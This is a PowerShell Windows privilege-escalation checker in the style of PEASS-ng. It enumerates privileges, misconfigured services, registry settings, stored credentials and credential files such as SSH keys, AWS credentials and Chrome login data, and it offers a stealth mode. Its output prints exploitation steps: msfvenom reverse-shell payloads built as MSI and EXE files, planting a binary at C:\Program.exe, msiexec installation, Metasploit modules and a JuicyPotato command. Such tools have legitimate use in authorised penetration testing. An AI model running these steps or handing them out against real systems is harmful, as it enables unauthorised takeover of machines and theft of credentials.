# Windows Privilege Escalation Checker
# Version: 2.0 - PEASS-ng Inspired Professional Edition
# Comprehensive system enumeration and privesc vector identification
# Run as: powershell -ExecutionPolicy Bypass -File windows-privesc.ps1

param(
    [string]$OutputFile = "",
    [switch]$Quick = $false,
    [switch]$Json = $false,
    [switch]$Stealth = $false,
    [switch]$Help = $false
)

# Show help
if ($Help) {
    @"
USAGE:
    .\windows-privesc.ps1 [OPTIONS]

OPTIONS:
    -OutputFile FILE       Save report to file
    -Quick                 Quick scan (high priority only)
    -Json                  Output in JSON format
    -Stealth               Stealth mode (no colors, minimal output)
    -Help                  Show this help

EXAMPLES:
    # Full scan
    .\windows-privesc.ps1

    # Save report
    .\windows-privesc.ps1 -OutputFile report.txt

    # Quick scan
    .\windows-privesc.ps1 -Quick

    # JSON output
    .\windows-privesc.ps1 -Json

    # Stealth mode (OPSEC)
    .\windows-privesc.ps1 -Stealth

"@ | Write-Host
    exit 0
}

# Colors (PowerShell 5.0+)
$colors = @{
    Red = "Red"
    Yellow = "Yellow"
    Green = "Green"
    Cyan = "Cyan"
    Magenta = "Magenta"
    White = "White"
}

function Write-Info { 
    param([string]$Message) 
    if (-not $Stealth) { Write-Host "[*] $Message" -ForegroundColor $colors.Cyan }
}
function Write-Good { 
    param([string]$Message) 
    if (-not $Stealth) { Write-Host "[+] $Message" -ForegroundColor $colors.Green }
}
function Write-Warn { 
    param([string]$Message) 
    if (-not $Stealth) { Write-Host "[!] $Message" -ForegroundColor $colors.Yellow }
}
function Write-Critical { 
    param([string]$Message) 
    if (-not $Stealth) { Write-Host "[CRITICAL] $Message" -ForegroundColor $colors.Red }
}
function Write-High { 
    param([string]$Message) 
    if (-not $Stealth) { Write-Host "[HIGH] $Message" -ForegroundColor $colors.Red }
}
function Write-Medium { 
    param([string]$Message) 
    if (-not $Stealth) { Write-Host "[MEDIUM] $Message" -ForegroundColor $colors.Yellow }
}

# Banner
function Show-Banner {
    if (-not $Stealth) {
        Write-Host @"
╔═══════════════════════════════════════════════════════════════════╗
║     WINDOWS PRIVILEGE ESCALATION CHECKER                        ║
║          PEASS-ng Inspired Professional Edition                 ║
╚═══════════════════════════════════════════════════════════════════╝
"@ -ForegroundColor $colors.Cyan
    }
}

# JSON output variables
$script:FindingList = @()
$script:ExploitList = @()

function Add-Finding {
    param(
        [string]$Type,
        [string]$Severity,
        [string]$Title,
        [string]$Description,
        [string]$Exploit = ""
    )
    $script:FindingList += @{
        Type = $Type
        Severity = $Severity
        Title = $Title
        Description = $Description
        Exploit = $Exploit
    }
}

function Add-Exploit {
    param(
        [string]$Name,
        [string]$CVE,
        [string]$Platform,
        [string]$Link
    )
    $script:ExploitList += @{
        Name = $Name
        CVE = $CVE
        Platform = $Platform
        Link = $Link
    }
}

function Get-JSONOutput {
    @{
        Timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ss")
        OS = (Get-ComputerInfo).WindowsProductName
        User = $env:USERNAME
        Hostname = $env:COMPUTERNAME
        Findings = $script:FindingList
        Exploits = $script:ExploitList
    } | ConvertTo-Json -Depth 5
}

# Section header
function Show-Section {
    param([string]$Title)
    if (-not $Stealth) {
        Write-Host "`n═══════════════════════════════════════════════════════════════════" -ForegroundColor $colors.Cyan
        Write-Host "  $Title" -ForegroundColor $colors.Cyan
        Write-Host "═══════════════════════════════════════════════════════════════════`n" -ForegroundColor $colors.Cyan
    }
}

# System Information
function Check-SystemInfo {
    Show-Section -Title "SYSTEM INFORMATION"
    
    $computerInfo = Get-ComputerInfo
    Write-Info "Hostname: $($env:COMPUTERNAME)"
    Write-Info "OS: $($computerInfo.WindowsProductName)"
    Write-Info "Version: $($computerInfo.WindowsVersion)"
    Write-Info "Build: $($computerInfo.WindowsBuild)"
    Write-Info "Architecture: $($env:PROCESSOR_ARCHITECTURE)"
    Write-Info "Current User: $($env:USERNAME)"
    Write-Info "User Domain: $($env:USERDOMAIN)"
    Write-Info "Current Directory: $($pwd.Path)"
    
    # Hotfixes
    Write-Info "Installed Hotfixes (Recent 10):"
    Get-HotFix | Select-Object -First 10 | ForEach-Object {
        Write-Host "  $($_.HotFixID) - $($_.InstalledOn)"
    }
    
    # Check for recent CVEs
    Write-Info "Checking for potentially missing patches..."
    $hotfixes = (Get-HotFix | Select-Object -ExpandProperty HotFixID) -join ","
    
    if ($hotfixes -notlike "*KB500*") {
        Write-Warn "Missing recent security updates"
    }
}

# User and Group Enumeration
function Check-UsersGroups {
    Show-Section -Title "USER & GROUP ENUMERATION"
    
    Write-Info "Current user context:"
    whoami
    whoami /groups | Select-String "Group Name"
    
    Write-Info "Local users:"
    Get-LocalUser | Where-Object { $_.Enabled } | ForEach-Object { 
        Write-Host "  $($_.Name) (Enabled)"
    }
    
    Write-Info "Local administrators:"
    Get-LocalGroupMember -Group "Administrators" 2>$null | ForEach-Object {
        Write-High "  $($_.Name)"
        Add-Finding -Type "admin" -Severity "high" -Title "Admin user" -Description "$($_.Name)"
    }
    
    # Check current user privileges
    Write-Info "Current user privileges:"
    whoami /priv | Select-String "Privilege" | ForEach-Object { Write-Host "  $_" }
    
    # Check for interesting privileges
    $privs = whoami /priv
    $interesting = @("SeImpersonate", "SeDebug", "SeTakeOwnership", "SeBackup", "SeRestore", "SeAssignPrimary")
    
    foreach ($priv in $interesting) {
        if ($privs -match $priv) {
            Write-High "Interesting privilege: $priv"
            Add-Finding -Type "privilege" -Severity "high" -Title "Interesting privilege" -Description "$priv" -Exploit "Use Incognito or Rotten Potato"
        }
    }
    
    # Check if admin
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Critical "Already running as Administrator!"
    } else {
        Write-Warn "Not running as Administrator"
    }
}

# AlwaysInstallElevated
function Check-AlwaysInstallElevated {
    Show-Section -Title "ALWAYSINSTALLENABLED"
    
    Write-Info "Checking AlwaysInstallElevated registry keys..."
    
    $aie1 = Get-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
    $aie2 = Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
    
    if ($aie1.AlwaysInstallElevated -eq 1 -or $aie2.AlwaysInstallElevated -eq 1) {
        Write-Critical "AlwaysInstallElevated is ENABLED!"
        Add-Finding -Type "registry" -Severity "critical" -Title "AlwaysInstallElevated enabled" -Description "Can install MSI as SYSTEM" -Exploit "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f msi -o payload.msi"
        Write-Host "`nExploitation:" -ForegroundColor $colors.Magenta
        Write-Host "  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f msi -o shell.msi" -ForegroundColor $colors.White
        Write-Host "  msiexec /quiet /i shell.msi" -ForegroundColor $colors.White
    } else {
        Write-Good "AlwaysInstallElevated is not enabled"
    }
}

# Unquoted Service Paths
function Check-UnquotedServicePaths {
    Show-Section -Title "UNQUOTED SERVICE PATHS"
    
    Write-Info "Checking for unquoted service paths..."
    
    $services = Get-WmiObject -Class Win32_Service | Where-Object { 
        $_.PathName -and 
        $_.PathName -notlike '"*' -and 
        $_.PathName -match ' ' 
    }
    
    if ($services) {
        Write-Critical "Unquoted service paths found:"
        $services | ForEach-Object {
            Write-Host "  Service: $($_.Name)" -ForegroundColor $colors.Red
            Write-Host "  Path: $($_.PathName)" -ForegroundColor $colors.Red
            Write-Host "  StartMode: $($_.StartMode)" -ForegroundColor $colors.Yellow
            Add-Finding -Type "service" -Severity "high" -Title "Unquoted service path" -Description "$($_.Name): $($_.PathName)" -Exploit "Place malicious binary in path"
        }
        
        Write-Host "`nExploitation:" -ForegroundColor $colors.Magenta
        Write-Host "  # Create reverse shell at C:\Program.exe" -ForegroundColor $colors.White
        Write-Host "  msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=443 -f exe > shell.exe" -ForegroundColor $colors.White
        Write-Host "  cp shell.exe 'C:\Program.exe'" -ForegroundColor $colors.White
    } else {
        Write-Good "No unquoted service paths found"
    }
}

# Weak Service Permissions
function Check-ServicePermissions {
    Show-Section -Title "SERVICE PERMISSIONS"
    
    Write-Info "Checking service permissions..."
    
    # Check if we can modify services
    $services = Get-WmiObject -Class Win32_Service
    
    foreach ($service in $services) {
        try {
            $acl = Get-Acl "Win32::Name='$($service.Name)'" -ErrorAction SilentlyContinue
            if ($acl) {
                # Check for weak permissions
                $accessRules = $acl.Access | Where-Object { $_.IdentityReference -match "Everyone|Users|BUILTIN" }
                if ($accessRules -and ($accessRules.FileSystemRights -match "Full|Modify")) {
                    Write-Warn "Weak permissions on service: $($service.Name)"
                    Write-Host "  Path: $($service.PathName)" -ForegroundColor $colors.Yellow
                }
            }
        } catch {
            # Continue if we can't check
        }
    }
    
    Write-Info "Services running as SYSTEM:"
    $services | Where-Object { $_.StartName -eq "LocalSystem" } | ForEach-Object {
        Write-Host "  $($_.Name) - $($_.PathName)" -ForegroundColor $colors.Cyan
    }
}

# Stored Credentials
function Check-StoredCredentials {
    Show-Section -Title "STORED CREDENTIALS"
    
    Write-Info "Checking for stored credentials..."
    
    # cmdkey
    Write-Info "Stored Windows credentials (cmdkey):"
    $cmdkey = cmdkey /list 2>&1
    if ($cmdkey -match "Target:") {
        $cmdkey | Select-String "Target:" | ForEach-Object {
            Write-Warn "  $_"
            Add-Finding -Type "credential" -Severity "high" -Title "Stored credential" -Description "$_" -Exploit "Use runas /savecred"
        }
    } else {
        Write-Host "  No stored credentials found" -ForegroundColor $colors.Green
    }
    
    # PowerShell credentials
    Write-Info "PowerShell credential manager:"
    $credPaths = @(
        "$env:APPDATA\Microsoft\Credentials",
        "$env:LOCALAPPDATA\Microsoft\Credentials"
    )
    
    foreach ($path in $credPaths) {
        if (Test-Path $path) {
            Get-ChildItem -Path $path -ErrorAction SilentlyContinue | ForEach-Object {
                Write-Warn "  Credential file: $($_.FullName)"
            }
        }
    }
}

# DLL Hijacking
function Check-DLLHijacking {
    Show-Section -Title "DLL HIJACKING"
    
    Write-Info "Checking for DLL hijacking opportunities..."
    
    # Check common DLL paths
    $dllPaths = @(
        "$env:SystemRoot\System32",
        "$env:SystemRoot",
        "$env:ProgramFiles",
        "$env:LocalAppData"
    )
    
    Write-Info "Writable system directories:"
    foreach ($path in $dllPaths) {
        if (Test-Path $path) {
            $acl = Get-Acl $path -ErrorAction SilentlyContinue
            if ($acl) {
                $everyoneWrite = $acl.Access | Where-Object { 
                    $_.IdentityReference -match "Everyone" -and 
                    $_.FileSystemRights -match "Write|Modify|Full"
                }
                if ($everyoneWrite) {
                    Write-High "  Writable: $path"
                    Add-Finding -Type "dll" -Severity "medium" -Title "Writable DLL path" -Description "$path" -Exploit "DLL hijacking possible"
                }
            }
        }
    }
    
    Write-Host "`nCommon DLL hijacking locations:" -ForegroundColor $colors.Magenta
    Write-Host "  C:\Windows\System32" -ForegroundColor $colors.White
    Write-Host "  C:\Windows" -ForegroundColor $colors.White
    Write-Host "  C:\Program Files\" -ForegroundColor $colors.White
}

# Scheduled Tasks
function Check-ScheduledTasks {
    Show-Section -Title "SCHEDULED TASKS"
    
    Write-Info "Scheduled tasks running as SYSTEM:"
    Get-ScheduledTask | Where-Object { 
        $_.Principal.UserId -eq "SYSTEM" -or 
        $_.Principal.UserId -eq "NT AUTHORITY\SYSTEM"
    } | ForEach-Object {
        Write-High "  Task: $($_.TaskName)"
        Write-Host "    Path: $($_.TaskPath)" -ForegroundColor $colors.Yellow
        Add-Finding -Type "task" -Severity "high" -Title "SYSTEM task" -Description "$($_.TaskName)" -Exploit "Modify task binary"
    }
    
    Write-Info "All scheduled tasks:"
    Get-ScheduledTask | Select-Object -First 10 | ForEach-Object {
        Write-Host "  $($_.TaskName)"
    }
}

# Print Spooler
function Check-PrintSpooler {
    Show-Section -Title "PRINT SPOOLER"
    
    Write-Info "Checking Print Spooler service..."
    
    $spooler = Get-Service Spooler -ErrorAction SilentlyContinue
    if ($spooler -and $spooler.Status -eq "Running") {
        Write-Warn "Print Spooler is running!"
        Add-Finding -Type "service" -Severity "medium" -Title "Print Spooler running" -Description "Potential PrintNightmare exploitation" -Exploit "CVE-2021-34527"
        
        Write-Host "`nPrintNightmare exploitation:" -ForegroundColor $colors.Magenta
        Write-Host "  # Check for vulnerable configuration" -ForegroundColor $colors.White
        Write-Host "  Get-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint' -Name 'UpdateWizardUsers'" -ForegroundColor $colors.White
    } else {
        Write-Good "Print Spooler is not running"
    }
}

# Registry Autoruns
function Check-Autoruns {
    Show-Section -Title "AUTORUN PROGRAMS"
    
    Write-Info "Checking autorun locations..."
    
    $autorunPaths = @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx"
    )
    
    foreach ($path in $autorunPaths) {
        if (Test-Path $path) {
            Write-Host "`n  $path :" -ForegroundColor $colors.Yellow
            Get-ItemProperty -Path $path -ErrorAction SilentlyContinue | ForEach-Object {
                $_.PSObject.Properties | Where-Object { $_.Name -notmatch "^PS" } | ForEach-Object {
                    Write-Host "    $($_.Name) = $($_.Value)" -ForegroundColor $colors.White
                    Add-Finding -Type "autorun" -Severity "medium" -Title "Autorun entry" -Description "$($_.Name): $($_.Value)" -Exploit "Modify autorun for persistence"
                }
            }
        }
    }
}

# Interesting Files
function Check-InterestingFiles {
    Show-Section -Title "INTERESTING FILES"
    
    # SAM and SYSTEM files
    Write-Info "Checking SAM/SYSTEM files..."
    $samPaths = @(
        "C:\Windows\System32\config\SAM",
        "C:\Windows\System32\config\SYSTEM",
        "C:\Windows\repair\SAM",
        "C:\Windows\repair\SYSTEM"
    )
    
    foreach ($path in $samPaths) {
        if (Test-Path $path) {
            Write-Warn "Found: $path"
        }
    }
    
    # Credential files
    Write-Info "Checking for credential files..."
    $credPaths = @(
        "$env:USERPROFILE\.ssh\id_rsa",
        "$env:USERPROFILE\.ssh\id_dsa",
        "$env:USERPROFILE\.aws\credentials",
        "$env:USERPROFILE\.azure\accessTokens.json",
        "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    )
    
    foreach ($path in $credPaths) {
        if (Test-Path $path) {
            Write-Critical "Credential file found: $path"
            Add-Finding -Type "credential" -Severity "critical" -Title "Credential file" -Description "$path" -Exploit "Extract credentials"
        }
    }
    
    # Browser data
    Write-Info "Chrome browser data:"
    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    if (Test-Path $chromePath) {
        Write-Warn "Chrome login data found"
        Add-Finding -Type "browser" -Severity "medium" -Title "Chrome data" -Description "Chrome login database accessible" -Exploit "Use SharpChromium"
    }
    
    # PowerShell history
    Write-Info "PowerShell history:"
    $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $historyPath) {
        Write-Warn "PowerShell history found"
        Get-Content $historyPath -ErrorAction SilentlyContinue | Select-String -Pattern "password|secret|token|key|credential" | ForEach-Object {
            Write-Host "  $_" -ForegroundColor $colors.Yellow
        }
    }
}

# Windows Defender / AMSI
function Check-DefenderAMSI {
    Show-Section -Title "WINDOWS DEFENDER / AMSI"
    
    Write-Info "Checking Windows Defender status..."
    
    $defender = Get-MpPreference -ErrorAction SilentlyContinue
    if ($defender) {
        if ($defender.DisableRealtimeMonitoring -eq $true) {
            Write-High "Windows Defender Realtime Monitoring is DISABLED!"
            Add-Finding -Type "av" -Severity "high" -Title "Defender disabled" -Description "Realtime monitoring disabled" -Exploit "Run payloads without detection"
        }
        
        if ($defender.DisableScanScheduedTasks -eq $true) {
            Write-Warn "Scheduled scanning is disabled"
        }
    }
    
    Write-Info "AMSI Status:"
    $amsi = Get-ChildItem -Path "HKLM:\SOFTWARE\Microsoft\AMSI" -ErrorAction SilentlyContinue
    if ($amsi) {
        Write-Host "  AMSI registry keys found" -ForegroundColor $colors.Yellow
    }
}

# Network Configuration
function Check-Network {
    Show-Section -Title "NETWORK CONFIGURATION"
    
    Write-Info "Network interfaces:"
    Get-NetIPAddress | Where-Object { $_.AddressFamily -eq "IPv4" } | ForEach-Object {
        Write-Host "  $($_.InterfaceAlias): $($_.IPAddress)/$($_.PrefixLength)" -ForegroundColor $colors.Cyan
    }
    
    Write-Info "Listening ports:"
    Get-NetTCPConnection -State Listen | Select-Object -First 15 | ForEach-Object {
        $process = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
        Write-Host "  $($_.LocalAddress):$($_.LocalPort) - $($process.ProcessName)" -ForegroundColor $colors.White
    }
    
    Write-Info "Firewall status:"
    Get-NetFirewallProfile | ForEach-Object {
        Write-Host "  $($_.Name): Enabled=$($_.Enabled)" -ForegroundColor $colors.Cyan
    }
}

# Installed Software
function Check-InstalledSoftware {
    Show-Section -Title "INSTALLED SOFTWARE"
    
    Write-Info "Installed software (interesting):"
    $interesting = @("python", "perl", "ruby", "java", "git", "svn", "mysql", "postgresql", "apache", "nginx", "tomcat", "jetty")
    
    foreach ($software in $interesting) {
        $found = Get-Command $software -ErrorAction SilentlyContinue
        if ($found) {
            Write-Good "Found: $software - $($found.Source)"
        }
    }
}

# WMI Event Subscriptions
function Check-WMISubscriptions {
    Show-Section -Title "WMI EVENT SUBSCRIPTIONS"
    
    Write-Info "Checking WMI subscriptions..."
    
    $subs = Get-WmiObject -Namespace "root\subscription" -Class __EventConsumer 2>$null
    if ($subs) {
        Write-Warn "WMI event consumers found:"
        $subs | ForEach-Object {
            Write-Host "  $($_.ClassPath)" -ForegroundColor $colors.Yellow
        }
        Add-Finding -Type "wmi" -Severity "medium" -Title "WMI subscriptions" -Description "WMI event consumers present" -Exploit "WMI persistence/privilege escalation"
    } else {
        Write-Good "No WMI subscriptions found"
    }
}

# GPP Passwords
function Check-GPPPasswords {
    Show-Section -Title "GROUP POLICY PASSWORDS"
    
    Write-Info "Checking for GPP passwords..."
    
    $gppPaths = @(
        "\\$env:COMPUTERNAME\SYSVOL\*",
        "\\$env:COMPUTERNAME\Policies\*"
    )
    
    Write-Host "  Searching for Groups.xml and similar..." -ForegroundColor $colors.Yellow
    Write-Host "  msfconsole -q" -ForegroundColor $colors.White
    Write-Host "  use post/windows/gather/credentials/domain_hashdump" -ForegroundColor $colors.White
}

# Quick Scan
function Quick-Scan {
    Show-Section -Title "QUICK PRIVILEGE ESCALATION SCAN"
    
    Write-Info "Running quick privilege escalation checks..."
    
    # AlwaysInstallElevated
    $aie = Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
    if ($aie.AlwaysInstallElevated -eq 1) {
        Write-Critical "AlwaysInstallElevated - CRITICAL"
    }
    
    # Unquoted paths
    $unquoted = Get-WmiObject -Class Win32_Service | Where-Object { 
        $_.PathName -notlike '"*' -and $_.PathName -match ' ' 
    }
    if ($unquoted) {
        Write-High "Unquoted service paths found"
    }
    
    # Stored credentials
    $cmdkey = cmdkey /list 2>&1
    if ($cmdkey -match "Target:") {
        Write-High "Stored credentials found"
    }
    
    # Interesting privileges
    $privs = whoami /priv
    if ($privs -match "SeImpersonate") {
        Write-High "SeImpersonate privilege - Potato attacks possible"
    }
    if ($privs -match "SeDebug") {
        Write-High "SeDebug privilege - Process memory access"
    }
}

# Exploit Suggestions
function Show-Exploits {
    Show-Section -Title "EXPLOIT SUGGESTIONS"
    
    Write-Info "Common privilege escalation techniques:"
    
    Write-Host "`nMetasploit Modules:" -ForegroundColor $colors.Magenta
    Write-Host "  use post/multi/recon/local_exploit_suggester" -ForegroundColor $colors.White
    Write-Host "  use exploit/windows/local/always_install_elevated" -ForegroundColor $colors.White
    Write-Host "  use exploit/windows/local/service_permissions" -ForegroundColor $colors.White
    
    Write-Host "`nJuicy Potato (SeImpersonate):" -ForegroundColor $colors.Magenta
    Write-Host "  https://github.com/ohpe/juicy-potato" -ForegroundColor $colors.White
    Write-Host "  JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c {CLSID}" -ForegroundColor $colors.White
    
    Write-Host "`nPrintNightmare (CVE-2021-34527):" -ForegroundColor $colors.Magenta
    Write-Host "  https://github.com/cube0x0/CVE-2021-1675" -ForegroundColor $colors.White
    
    Write-Host "`nSharpShooter:" -ForegroundColor $colors.Magenta
    Write-Host "  https://github.com/mdsecactivebreach/SharpShooter" -ForegroundColor $colors.White
    
    Write-Host "`nSharpChrome:" -ForegroundColor $colors.Magenta
    Write-Host "  https://github.com/mdsecactivebreach/SharpChrome" -ForegroundColor $colors.White
}

# Generate Summary
function Generate-Summary {
    Show-Section -Title "SUMMARY"
    
    Write-Info "Scan completed at: $(Get-Date)"
    
    if ($OutputFile) {
        Write-Info "Report saved to: $OutputFile"
    }
    
    Write-Host "`nPriority Actions:" -ForegroundColor $colors.Yellow
    Write-Host "  1. Check AlwaysInstallElevated registry" -ForegroundColor $colors.White
    Write-Host "  2. Check for unquoted service paths" -ForegroundColor $colors.White
    Write-Host "  3. Look for stored credentials" -ForegroundColor $colors.White
    Write-Host "  4. Check SeImpersonate for Potato attacks" -ForegroundColor $colors.White
    Write-Host "  5. Review scheduled tasks" -ForegroundColor $colors.White
    Write-Host "  6. Check for GPP passwords" -ForegroundColor $colors.White
    Write-Host "  7. Use Metasploit local_exploit_suggester" -ForegroundColor $colors.White
}

# Main execution
Show-Banner

if ($Json) {
    # JSON mode - run core checks
    Check-UsersGroups
    Check-AlwaysInstallElevated
    Check-StoredCredentials
    Get-JSONOutput | Write-Host
    exit 0
}

# Run all checks
Check-SystemInfo
Check-UsersGroups
Check-AlwaysInstallElevated
Check-UnquotedServicePaths
Check-ServicePermissions
Check-StoredCredentials
Check-DLLHijacking
Check-ScheduledTasks
Check-PrintSpooler
Check-Autoruns
Check-InterestingFiles
Check-DefenderAMSI
Check-Network
Check-InstalledSoftware
Check-WMISubscriptions
Check-GPPPasswords

if ($Quick) {
    Quick-Scan
} else {
    Show-Exploits
}

Generate-Summary

# Save report if requested
if ($OutputFile) {
    $report = @()
    $report += "Windows Privilege Escalation Report"
    $report += "Generated: $(Get-Date)"
    $report += "=" * 50
    
    foreach ($finding in $script:FindingList) {
        $report += "[$($finding.Severity)] $($finding.Title)"
        $report += "  $($finding.Description)"
        $report += "  Exploit: $($finding.Exploit)"
        $report += ""
    }
    
    $report | Out-File -FilePath $OutputFile -Encoding UTF8
    Write-Good "Report saved to: $OutputFile"
}

Write-Good "Scan complete!"
